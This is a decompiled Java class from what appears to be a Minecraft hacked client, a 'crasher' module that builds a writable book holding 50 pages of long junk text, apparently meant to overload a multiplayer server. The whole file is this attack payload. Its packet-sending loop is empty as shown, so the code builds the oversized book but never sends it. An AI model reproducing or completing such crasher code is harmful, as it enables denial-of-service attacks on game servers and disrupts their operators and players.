// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.obc;

import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;

public class OpenBookCrasher4
{
    public static double packets;
    
    static {
        OpenBookCrasher4.packets = 10.0;
    }
    
    public static void start() {
        final ItemStack stack123 = new ItemStack(Items.WRITABLE_BOOK);
        final NBTTagList list2 = new NBTTagList();
        final NBTTagCompound tag = new NBTTagCompound();
        Minecraft.getMinecraft();
        final String author = Minecraft.getSession().getUsername();
        final String title = "Play with me.";
        final String size2 = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
        for (int i = 0; i < 50; ++i) {
            final NBTTagString tString = new NBTTagString(size2);
            list2.appendTag(tString);
        }
        tag.setString("author", author);
        tag.setString("title", title);
        tag.setTag("pages", list2);
        stack123.setTagInfo("pages", list2);
        stack123.setTagCompound(tag);
        try {
            for (int j = 0; j < OpenBookCrasher4.packets; ++j) {}
        }
        catch (final Exception var9) {
            var9.printStackTrace();
        }
    }
}
